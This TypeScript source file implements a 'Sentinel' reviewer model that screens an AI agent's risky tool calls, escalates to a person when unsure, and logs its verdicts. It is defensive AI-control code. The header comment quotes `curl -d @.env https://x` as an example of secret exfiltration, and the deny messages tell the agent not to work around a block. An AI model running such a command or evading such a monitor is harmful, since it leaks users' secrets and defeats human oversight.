/**
 * The Sentinel: an independent model that reviews the agent's high-risk tool
 * calls and can only object (ADR 0015).
 *
 * WHY IT EXISTS. Effect classes, the taint rule, the shell classifiers and the
 * approval cards are deterministic and stay the first line. What they cannot
 * read is *intent*: `curl -d @.env https://x` is a routine POST to a pattern
 * and an exfiltration to a person who knows the user never mentioned that
 * host. The owner asked for the reviewer the design deferred (§9, Q10), so
 * here it is — fenced in the way the field's monitors are (auto mode's
 * transcript classifier, METR's per-action monitor, "trusted monitoring" in
 * the AI-control literature): a different, cheap model, shown the user's
 * requests and the exact call, answering allow / deny / escalate.
 *
 * WHY IT CAN ONLY DENY. It is a pipeline guard (`tools/pipeline.ts`): `allow`
 * is "no objection" and the call continues exactly where it would have been
 * without a reviewer; `deny` refuses it with the reviewer's reason; `escalate`
 * hands it to a person — the run's approval card, or at L4 the approve-later
 * inbox for a custom tool (the only tools the inbox can replay), else a
 * refusal and a notification. A reviewer that times out, errors, or answers
 * in a shape we cannot read **escalates**; it never silently lets a call
 * through when it was supposed to look (fail safe).
 *
 * WHEN IT RUNS. Last among the guards, so a call the deterministic stages
 * refuse never costs a review, and only for the calls `sentinelTrigger`
 * names (see `sentinel/policy`). Skipped for a call a person has already
 * approved in this dispatch (`HUMAN_APPROVED`): the person saw the exact call,
 * and asking them again because a cheaper reviewer was unsure is noise.
 *
 * AUDIT. Every review is one line in `aicoHome()/sentinel/verdicts.jsonl`
 * (append-only, arguments redacted and clipped, cost and latency), read by the
 * Activity page's Sentinel section through `/api/system/sentinel/list`.
 *
 * Not here, deliberately: an allow that skips a later guard (impossible by
 * type), a reviewer that sees tool *results* (that is where injections live;
 * it sees which untrusted sources were read, by name), and a second
 * "reasoning" pass — one short call with thinking off keeps a review at
 * roughly a tenth of a cent.
 *
 * @module sentinel
 */

import fs from 'node:fs';
import path from 'node:path';
import { aicoHome } from '../home.js';
import type { AicoSettings } from '../settings.js';
import type { ProviderAPI } from '../providers/types.js';
import type { ToolPipeline } from '../tools/pipeline.js';
import { createTokenTracker } from '../tokens.js';
import { pushNotification } from '../background/notifications.js';
import { isMcpToolName, isReadOnlyMcpTool, parseMcpToolName } from '../mcp/policy.js';
import { mcpRegistry } from '../mcp/registry.js';
import { runPreview, taints, type CustomToolStageOptions, type UsableTools } from '../custom-tools/policy.js';
import {
  DEFAULT_SENTINEL_TIMEOUT_MS, SENTINEL_SYSTEM, buildReviewInput, parseSentinelReply, redactForReview, sentinelTrigger,
  type SentinelEffect, type SentinelTrigger, type SentinelVerdict, type TriggerFacts,
} from './policy.js';

export * from './policy.js';

/** `ctx.state` key an approval stage sets when a person said yes to this exact call. */
export const HUMAN_APPROVED = 'human-approved';

// ── one review ───────────────────────────────────────────────────────

export interface ReviewOutcome {
  verdict: SentinelVerdict;
  reason: string;
  model: string;
  costUsd: number;
  ms: number;
  /** Set when no verdict was read: timeout, provider error, unreadable reply. */
  failure?: string;
}

/** What a stage calls to get a verdict. Injected by tests; `reviewCall` otherwise. */
export type Reviewer = (prompt: string, o: { model: string; settings?: AicoSettings; signal?: AbortSignal; timeoutMs: number }) => Promise<ReviewOutcome>;

let testReviewer: Reviewer | undefined;
/** Tests: answer every review in this process with `r` (undefined restores the model). */
export function setSentinelReviewerForTest(r: Reviewer | undefined): void { testReviewer = r; }

/**
 * Ask the reviewer model once. Thinking off (a thinking `deepseek-v4-pro`
 * spends its budget reasoning and returns no verdict — `evals/judge` learned
 * this), a short answer, a hard deadline. Never throws; every failure is an
 * `escalate` with the failure named.
 */
export async function reviewCall(prompt: string, o: {
  model: string; settings?: AicoSettings; signal?: AbortSignal; timeoutMs: number; provider?: ProviderAPI;
}): Promise<ReviewOutcome> {
  const started = Date.now();
  const tracker = createTokenTracker();
  const fail = (failure: string): ReviewOutcome => ({
    verdict: 'escalate', reason: `the safety reviewer could not answer (${failure}), so a person decides`,
    model: o.model, costUsd: tracker.estimateCost(o.model, o.settings), ms: Date.now() - started, failure,
  });
  let provider: ProviderAPI;
  try {
    // Lazy for the reason evals/judge gives: the provider registry loads every adapter.
    provider = o.provider ?? (await import('../providers/index.js')).selectProvider(o.model, o.settings);
  } catch (err) { return fail(`no provider for ${o.model}: ${(err as Error).message}`); }

  const controller = new AbortController();
  const signal = o.signal ? AbortSignal.any([o.signal, controller.signal]) : controller.signal;
  let timer: NodeJS.Timeout | undefined;
  const deadline = new Promise<'timeout'>((resolve) => {
    timer = setTimeout(() => { controller.abort(); resolve('timeout'); }, Math.max(1, o.timeoutMs));
  });
  const { runInContext, currentRunContext } = await import('../run-context.js');
  const ctx = currentRunContext();
  const work = runInContext({ ...(ctx ?? {}), cwd: ctx?.cwd ?? process.cwd(), effort: 'off' }, async () => {
    let text = '';
    for await (const event of provider.chat({
      model: o.model, systemPrompt: SENTINEL_SYSTEM, messages: [{ role: 'user', content: prompt }],
      tools: [], maxTokens: 400, signal,
    })) {
      if (event.type === 'text') text += event.content;
      else if (event.type === 'usage') tracker.add(event.inputTokens, event.outputTokens, event.cacheReadTokens ?? 0, event.cacheWriteTokens ?? 0);
    }
    return text;
  });
  work.catch(() => { /* settled by the race below; a late rejection after a timeout is expected */ });
  try {
    const got = await Promise.race([work, deadline]);
    if (got === 'timeout') return fail(`no answer within ${Math.round(o.timeoutMs / 1000)} s`);
    const parsed = parseSentinelReply(got);
    return {
      verdict: parsed.verdict, reason: parsed.reason, model: o.model,
      costUsd: tracker.estimateCost(o.model, o.settings), ms: Date.now() - started,
      ...(parsed.parsed ? {} : { failure: parsed.reason }),
    };
  } catch (err) {
    return fail((err as Error).message.slice(0, 200));
  } finally {
    clearTimeout(timer);
    // Spend per model role (ADR 0017): whatever the call cost, answered or not.
    const { recordRoleSpend } = await import('../models/roles.js');
    recordRoleSpend('sentinel', tracker.estimateCost(o.model, o.settings));
  }
}

// ── audit ────────────────────────────────────────────────────────────

export type SentinelOutcome =
  | 'no-objection' | 'refused' | 'person-allowed' | 'person-refused' | 'parked' | 'refused-unattended' | 'proceeded-unasked';

export interface SentinelRecord {
  at: number;
  sessionId?: string;
  agentId: string;
  agentName?: string;
  level?: string;
  tool: string;
  effect: SentinelEffect;
  why: string;
  verdict: SentinelVerdict;
  reason: string;
  outcome: SentinelOutcome;
  model: string;
  costUsd: number;
  ms: number;
  failure?: string;
  /** The call, redacted and clipped to 300 characters. */
  call: string;
}

export function sentinelFile(): string {
  return path.join(aicoHome(), 'sentinel', 'verdicts.jsonl');
}

function record(r: SentinelRecord): void {
  try {
    fs.mkdirSync(path.dirname(sentinelFile()), { recursive: true });
    fs.appendFileSync(sentinelFile(), `${JSON.stringify(r)}\n`, 'utf8');
  } catch (err) {
    // The verdict still applies; only its record is lost, and that is said.
    console.warn(`  ⚠ Sentinel: could not record a verdict: ${(err as Error).message}`);
  }
}

/** Recent reviews (newest first) and totals over the whole file. */
export function listSentinelVerdicts(limit = 50): {
  verdicts: SentinelRecord[];
  totals: { reviews: number; denied: number; escalated: number; costUsd: number };
} {
  let text = '';
  try { text = fs.readFileSync(sentinelFile(), 'utf8'); } catch { /* nothing reviewed yet */ }
  const all: SentinelRecord[] = [];
  for (const line of text.split('\n')) {
    if (!line.trim()) continue;
    try { all.push(JSON.parse(line) as SentinelRecord); } catch { /* a torn last line from a crash mid-append */ }
  }
  const totals = { reviews: all.length, denied: 0, escalated: 0, costUsd: 0 };
  for (const r of all) {
    if (r.verdict === 'deny') totals.denied++;
    if (r.verdict === 'escalate') totals.escalated++;
    totals.costUsd += r.costUsd || 0;
  }
  return { verdicts: all.slice(-Math.max(1, limit)).reverse(), totals };
}

// ── what the session says ────────────────────────────────────────────

type LogEvent = { type: string; data: unknown };

/**
 * The person's own messages, oldest first: `user/message` events from a human
 * (not a plugin, tool or compaction), else the client's history, then this
 * turn's task when it is not already the last one.
 */
export function userRequestsOf(
  events: ReadonlyArray<LogEvent> | undefined,
  history: ReadonlyArray<{ role: string; content: string }> | undefined,
  task: string | undefined,
): string[] {
  const out: string[] = [];
  if (events?.length) {
    for (const e of events) {
      if (e.type !== 'user/message') continue;
      const d = e.data as { content?: unknown; source?: { kind?: string } };
      if (d.source?.kind && d.source.kind !== 'human') continue;
      if (typeof d.content === 'string' && d.content.trim()) out.push(d.content);
    }
  } else if (history?.length) {
    for (const m of history) if (m.role === 'user' && typeof m.content === 'string' && m.content.trim()) out.push(m.content);
  }
  if (task?.trim() && out[out.length - 1]?.trim() !== task.trim()) out.push(task);
  return out.slice(-6);
}

/**
 * The run's requests plus any the person added since it started (a steer
 * mid-run is recorded as their own message), oldest first, last six.
 */
export function mergeRequests(atStart: readonly string[], live: readonly string[]): string[] {
  const out = [...atStart];
  for (const r of live) if (!out.some(o => o.trim() === r.trim())) out.push(r);
  return out.slice(-6);
}

/** The last calls in a session's log, for the reviewer's "recent activity". */
export function recentCallsOf(events: ReadonlyArray<LogEvent> | undefined, max = 8): Array<{ name: string; args: string }> {
  const out: Array<{ name: string; args: string }> = [];
  for (let i = (events?.length ?? 0) - 1; i >= 0 && out.length < max; i--) {
    const e = events![i]!;
    if (e.type !== 'tool/call') continue;
    const d = e.data as { name?: unknown; arguments?: unknown };
    out.push({ name: String(d.name ?? '?'), args: clip(String(d.arguments ?? ''), 200) });
  }
  return out.reverse();
}

/** Which tools fed the session untrusted content (the taint rule's sources), by name. */
export function untrustedSourcesOf(events: ReadonlyArray<LogEvent> | undefined, tainted: boolean): string[] {
  const names = new Set<string>();
  for (const e of events ?? []) {
    if (e.type !== 'tool/call') continue;
    const name = String((e.data as { name?: unknown }).name ?? '');
    if (taints(name)) names.add(name);
  }
  if (!names.size && tainted) names.add('(untrusted content earlier in this run)');
  return [...names];
}

/**
 * The L4 parker for an escalated call: custom tools only, the one kind the
 * inbox can replay exactly (ADR 0011). Runs the tool's preview, as its own
 * approval guard does, so the person sees what it would change.
 */
export function sentinelParker(
  tools: UsableTools,
  park: NonNullable<CustomToolStageOptions['park']>,
  cwd: string,
  sessionId?: string,
): NonNullable<SentinelStageOptions['park']> {
  return async (name, args, why) => {
    const tool = tools.get(name);
    if (!tool) return undefined;
    const preview = await runPreview(tool.def, args, { tools, cwd, ...(sessionId ? { sessionId } : {}) });
    const previewName = tool.def.preview?.tool;
    const previewTool = previewName ? tools.get(previewName) : undefined;
    return park({ tool, args, why, ...(preview ? { preview } : {}), ...(previewTool ? { previewTool } : {}) });
  };
}

// ── the stage ────────────────────────────────────────────────────────

export interface SentinelStageOptions {
  agentId: string;
  /** Whether this run is reviewed at all (`sentinelActive`). Read per call. */
  active: () => boolean;
  model: string;
  settings?: AicoSettings;
  timeoutMs?: number;
  cwd: () => string;
  tainted: () => boolean;
  /** What the person asked for in this session (trusted), oldest first. */
  requests: () => string[];
  /** The agent's text in the step that made the call. */
  intent: () => string | undefined;
  /** Recent calls in this session, oldest first. */
  recent: () => Array<{ name: string; args: string }>;
  /** Tools whose untrusted output the session has read. */
  untrusted: () => string[];
  /** A custom tool's declared effect, or undefined when the name is not one. */
  customEffect: (name: string) => TriggerFacts['customEffect'];
  /** Ask a person (the run's approval card); undefined when nobody can be asked. */
  ask?: (title: string, detail: string) => Promise<boolean>;
  /**
   * L4: put the exact call in the approve-later inbox. Resolves undefined
   * when the call is not one the inbox can replay (only custom tools are).
   */
  park?: (name: string, args: Record<string, unknown>, why: string) => Promise<{ id: string } | { error: string } | undefined>;
  /** No person is attending this run (L4, cron, background). */
  unattended: boolean;
  /** Escalations: ask a person (default) or proceed without asking (full autonomy). */
  onEscalate?: 'ask' | 'proceed';
  sessionId?: string;
  agentName?: string;
  level?: string;
  /** Tests inject a stub; `reviewCall` otherwise. */
  review?: Reviewer;
  aicoHome?: string;
}

const clip = (s: string, n: number): string => (s.length > n ? `${s.slice(0, n)}…` : s);

function factsFor(name: string, o: SentinelStageOptions): TriggerFacts {
  const custom = o.customEffect(name);
  const mcp = isMcpToolName(name) ? parseMcpToolName(name) : undefined;
  return {
    cwd: o.cwd(),
    tainted: o.tainted(),
    ...(custom ? { customEffect: custom } : {}),
    ...(mcp ? { mcp: { tool: mcp.tool, readOnly: isReadOnlyMcpTool(name), host: mcpRegistry.isHost(mcp.server) } } : {}),
    aicoHome: o.aicoHome ?? aicoHome(),
  };
}

/** Install the `sentinel` guard. Register it after every deterministic guard. Returns the disposer. */
export function installSentinel(pipeline: ToolPipeline, o: SentinelStageOptions): () => void {
  return pipeline.onGuard('sentinel', async (ctx) => {
    if (ctx.agentId !== o.agentId || !o.active()) return { kind: 'abstain' };
    if (ctx.state.get(HUMAN_APPROVED) === true) return { kind: 'abstain' };
    const args = ctx.arguments ?? {};
    const trigger: SentinelTrigger | undefined = sentinelTrigger(ctx.name, args, factsFor(ctx.name, o));
    if (!trigger) return { kind: 'abstain' };

    const intent = o.intent();
    const prompt = buildReviewInput({
      requests: o.requests(), tool: ctx.name, args, trigger,
      ...(intent ? { intent } : {}), recent: o.recent(), untrusted: o.untrusted(),
    });
    const timeoutMs = o.timeoutMs ?? o.settings?.sentinel?.timeoutMs ?? DEFAULT_SENTINEL_TIMEOUT_MS;
    let review: ReviewOutcome;
    try {
      review = await (o.review ?? testReviewer ?? reviewCall)(prompt, {
        model: o.model, timeoutMs, ...(o.settings ? { settings: o.settings } : {}), ...(ctx.signal ? { signal: ctx.signal } : {}),
      });
    } catch (err) {
      // A reviewer that throws is a reviewer that did not look: escalate, never allow.
      review = { verdict: 'escalate', reason: `the safety reviewer failed (${(err as Error).message}), so a person decides`, model: o.model, costUsd: 0, ms: 0, failure: (err as Error).message };
    }
    // Defence in depth against a stub or adapter returning something else.
    if (review.verdict !== 'allow' && review.verdict !== 'deny') review = { ...review, verdict: 'escalate' };

    let callText = '';
    try { callText = JSON.stringify(args); } catch { callText = '(unserialisable arguments)'; }
    const call = clip(redactForReview(`${ctx.name} ${callText}`), 300);
    const log = (outcome: SentinelOutcome): void => record({
      at: Date.now(), agentId: o.agentId, tool: ctx.name, effect: trigger.effect, why: trigger.why,
      verdict: review.verdict, reason: review.reason, outcome, model: review.model, costUsd: review.costUsd, ms: review.ms, call,
      ...(o.sessionId ? { sessionId: o.sessionId } : {}), ...(o.agentName ? { agentName: o.agentName } : {}),
      ...(o.level ? { level: o.level } : {}), ...(review.failure ? { failure: review.failure } : {}),
    });

    if (review.verdict === 'allow') { log('no-objection'); return { kind: 'abstain' }; }
    if (review.verdict === 'deny') {
      log('refused');
      return {
        kind: 'deny',
        reason: `SENTINEL: an independent safety reviewer stopped ${ctx.name} before it ran — ${review.reason} It has NOT run. `
          + 'Do not try to do the same thing another way (another tool, a shell command, a script). If the user wants it, '
          + 'tell them what was stopped and why; they can ask for it explicitly.',
      };
    }

    // Full autonomy: the person chose not to be asked. Not an approval — the
    // call continues under the ordinary rules, and the audit says so.
    if (o.onEscalate === 'proceed') { log('proceeded-unasked'); return { kind: 'abstain' }; }

    // Escalate: a person decides. Unattended runs park what the inbox can replay.
    const why = `Sentinel: ${review.reason}`;
    if (o.unattended || !o.ask) {
      if (o.park) {
        let parked: { id: string } | { error: string } | undefined;
        try { parked = await o.park(ctx.name, args, why); } catch (err) { parked = { error: (err as Error).message }; }
        if (parked && 'id' in parked) {
          log('parked');
          return {
            kind: 'deny',
            reason: `PARKED: the safety reviewer flagged ${ctx.name} for a person (${review.reason}), and this run is unattended, so the exact call was put in the AICO inbox (id ${parked.id}) for a person to approve later. It has NOT run. `
              + 'Do not try to do the same thing another way — not with another tool, not with a shell command. Finish everything else that does not depend on it, '
              + 'and say in your final report that this step is waiting for approval in the inbox.',
          };
        }
      }
      log('refused-unattended');
      pushNotification({
        title: `Sentinel stopped ${ctx.name}`,
        body: `${review.reason} Nobody was there to approve it, so it did not run.`,
        level: 'warning',
        sourceId: `sentinel:${o.sessionId ?? o.agentId}`,
      });
      return {
        kind: 'deny',
        reason: `SENTINEL: the safety reviewer flagged ${ctx.name} for a person (${review.reason}), and nobody is available to approve it in this run, so it was not run. `
          + 'Do not work around it; finish everything else and say in your final report that this step needs a person.',
      };
    }

    const detail = [
      `Safety reviewer (${review.model}): ${review.reason}`,
      `${trigger.effect} · reviewed because ${trigger.why}`,
      clip(redactForReview(`${ctx.name} ${callText}`), 1200),
    ].join('\n');
    let yes = false;
    try { yes = await o.ask(`Sentinel: ${ctx.name}`, detail); } catch { yes = false; }
    log(yes ? 'person-allowed' : 'person-refused');
    if (yes) { ctx.state.set(HUMAN_APPROVED, true); return { kind: 'abstain' }; }
    return {
      kind: 'deny',
      reason: `The person did not approve ${ctx.name} after the safety reviewer flagged it (${review.reason}). It was not run. Do not try to do the same thing another way.`,
    };
  });
}
